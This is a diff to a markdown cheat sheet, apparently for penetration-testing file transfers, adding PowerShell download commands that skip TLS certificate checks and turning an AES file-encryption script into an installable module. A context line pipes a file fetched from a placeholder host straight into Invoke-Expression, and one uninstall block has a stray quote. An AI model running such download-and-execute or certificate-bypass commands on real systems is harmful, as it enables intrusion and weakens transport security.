@@ -69,9 +69,14 @@ Invoke-WebRequest -Uri "http://<IP>:<PORT>/<FILE>" -Headers @{"Authorization"="B
 Invoke-WebRequest http://<IP>:<PORT>/<FILE> -UseBasicParsing | IEX
 ```
 
-**Destination Machine: ByPass SSL/TLS Error**  
+**Destination Machine: Skip SSL validation (PowerShell 7+)**  
 ```powershell
 Invoke-WebRequest -Uri "https://<IP>:<PORT>/<FILE>" -OutFile "<FILE>" -SkipCertificateCheck
+```
+
+**Destination Machine: Skip SSL validation (PowerShell 5.1 or previous)**  
+```powershell
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile("https://<IP>:<PORT>/<FILE>", "<FILE>")
 ```
 
 </details>
@@ -784,12 +789,15 @@ The shared folder will appear as a drive on the remote Windows session.
 &nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h2>File Encryption on Windows</h2></summary>
 
-Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the `Invoke-AESEncryption.ps1` PowerShell script. This script is small and provides encryption of files and strings.
+Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the [`Invoke-AESEncryption.ps1`](../scripts/Invoke-AESEncryption.ps1) PowerShell script. This script is small and provides encryption of files and strings.
 
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h3>Invoke-AESEncryption.ps1</h3></summary>
 
+**Installation & Configuration**
+
 ```powershell
+$moduleCode = @'
 function Invoke-AESEncryption {
     [CmdletBinding()]
     [OutputType([string])]
@@ -883,13 +891,42 @@ function Invoke-AESEncryption {
         $aesManaged.Dispose()
     }
 }
-```
-</details>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
-<summary><h3>Import Module Invoke-AESEncryption.ps1</h3></summary>
+'@
 
+# Create the directory for the current user
+$modulePath = "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\AESCrypt"
+if (!(Test-Path $modulePath)) {
+    New-Item -ItemType Directory -Path $modulePath -Force
+}
+
+# Save the module
+$moduleCode | Out-File "$modulePath\AESCrypt.psm1" -Encoding utf8
+
+# Import the module
+Import-Module AESCrypt -Force
+```
+
+> **Note:** To install globally (admin required), use the following route: **$modulePath = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AESCrypt"**
+
+**Uninstall for current user**
 ```powershell
-Import-Module .\Invoke-AESEncryption.ps1 
+Remove-Module AESCrypt -ErrorAction SilentlyContinue
+Remove-Item "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\AESCrypt" -Recurse -Force
+" 
+```
+
+**System-wide uninstall (admin required)**
+```powershell
+Remove-Module AESCrypt -ErrorAction SilentlyContinue
+Remove-Item "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AESCrypt" -Recurse -Force
+```
+
+**Verify Uninstallation**
+```powershell
+Get-Module AESCrypt -All | Remove-Module -ErrorAction SilentlyContinue
+if (!(Test-Path "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\AESCrypt")) {
+    Write-Output "Module completely removed"
+}
 ```
 
 </details>
